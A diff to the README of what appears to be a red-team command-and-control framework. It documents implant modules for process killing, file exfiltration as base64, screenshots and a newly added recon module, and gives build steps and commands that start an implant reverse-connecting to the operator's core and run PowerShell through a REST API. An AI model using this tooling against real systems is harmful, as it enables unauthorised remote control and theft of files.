@@ -14,7 +14,8 @@ entry point.
 | `proc_list.c` | none | Lists processes, TAB-separated `NAME\tPID\tPPID\tTHREADS`. Drives `ProcessList.vue` (the Processes tab). |
 | `proc_kill.c` | bstr (PID) | `OpenProcess(PROCESS_TERMINATE) + TerminateProcess`. Drives the Processes-tab Kill button. |
 | `ls.c` | raw text path (optional, default `.`) | Lists a directory via `FindFirstFileA` (`TYPE SIZE NAME`). Column-formatted. |
-| `file_list.c` | bstr (path, optional) | Lists a directory, `CWD: <path>` header + `D/F\tNAME\tSIZE\tEPOCH` per entry. Drives `FileBrowser.vue` (the Files tab). |
+| `file_list.c` | bstr (path, optional) | Lists a directory via `FindFirstFileW` (Unicode-safe — non-ASCII/Chinese paths + names round-trip via UTF-8↔UTF-16), `CWD: <path>` header + `D/F\tNAME\tSIZE\tEPOCH` per entry. Drives `FileBrowser.vue` (the Files tab). |
+| `sysinfo.c` | none | Recon BOF. Emits `KEY=VALUE` lines: `internal_ip` (UDP-connect trick), `external_ip` (HTTP GET `http://ifconfig.me/ip`), `user`, `computer`, `process`, `pid`, `os`+`os_build` (`NTDLL$RtlGetVersion`), `arch`, `online_time`. The Go core auto-runs this on every implant connect and parses it to populate the agent table. |
 | `download.c` | raw text path | Reads a file (≤2 MB) and prints it base64-encoded; the operator decodes to recover the file. Binary-safe via `BeaconOutput(len)`. |
 | `file_download.c` | bstr (path) | Reads a file (≤2 MB), prints `=== FILE: <path> ===\n<base64>`. Drives `FileBrowser.vue`'s download action (frontend strips the header, base64-decodes the rest, saves a Blob). |
 | `screenshot.c` | none | Captures the desktop via BitBlt, downscales to fit the core's ~4 MB line buffer, writes a **BMP** (`BITMAPFILEHEADER`+`INFOHEADER`+BGR pixels), prints `=== SCREENSHOT: <W>x<H> ===\n<base64>`. Drives `ScreenshotViewer.vue` (which hardcodes `data:image/bmp;base64,`). |
@@ -83,24 +84,24 @@ produced the tested objects.
 
 `.x64.o` files are gitignored (`*.o`). To stage them in the Go core's BOF
 library (so the GUI can list/run them by name), copy into
-`clients/go-server/bofs/`:
+`clients/server/bofs/`:
 
 ```sh
-cp examples/*.x64.o clients/go-server/bofs/
+cp examples/*.x64.o clients/server/bofs/
 ```
 
 ## End-to-end test (single Windows host)
 
-The Go core (`clients/go-server`) + Rust implant is the canonical E2E path
+The Go core (`clients/server`) + Rust implant is the canonical E2E path
 (the Wails GUI drives the same REST API):
 
 ```sh
 # 1. Build everything (a rust-toolchain.toml pins stable MSVC)
 cargo build --release
-cd clients/go-server && go build -o go-server.exe .
+cd clients/server && go build -o server.exe .
 # 2. Build + stage the BOFs (above)
 # 3. Start the core (implant TCP :4444, operator HTTP :8091)
-RUSTSTRIKE_BOFS=./bofs ./go-server.exe 4444 8091
+RUSTSTRIKE_BOFS=./bofs ./server.exe 4444 8091
 # 4. Run the implant (reverse-connects to the core)
 ./target/release/ruststrike-implant.exe 127.0.0.1 4444
 # 5. Drive via REST (returns a task_id; poll /api/tasks/{id} for output):
@@ -116,7 +117,7 @@ curl -X POST "http://127.0.0.1:8091/api/bofs/powershell_exec/run?implant=1" -H '
 #   python -c "import base64;p=b'C:\\Windows';n=len(p)+1;print(base64.b64encode(bytes([n&0xff,(n>>8)&0xff])+p+b'\x00').decode())"
 # then POST that b64 as {"args":"..."} to /api/bofs/file_list/run?implant=1.
 # 6. Or launch the GUI against the core:
-cd clients/wails-gui && wails dev   # desktop console in real mode
+cd clients/client && wails dev   # desktop console in real mode
 ```
 
 The reference Rust server (`crates/server`) also works for a quick single-implant
